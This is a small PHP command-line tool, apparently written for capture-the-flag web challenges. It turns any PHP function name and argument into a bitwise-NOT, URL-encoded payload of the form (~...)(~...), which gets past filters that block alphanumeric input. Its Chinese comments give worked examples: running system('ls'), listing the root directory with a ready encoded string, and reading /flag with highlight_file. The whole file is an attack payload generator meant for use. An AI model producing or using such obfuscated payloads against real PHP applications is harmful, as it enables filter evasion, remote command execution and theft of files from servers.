<?php
//在命令行中运行
/*！！！！！！用法如下
[+]your function: system
[+]your command: ("ls") 

扫目录：
    print_r(scandir(/))
    (~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)(~%D0));

读文件
    [+]your function: highlight_file
    [+]your command: /flag
*/
/*author yu22x*/

fwrite(STDOUT,'[+]your function: ');

$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

fwrite(STDOUT,'[+]your command: ');

$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
?>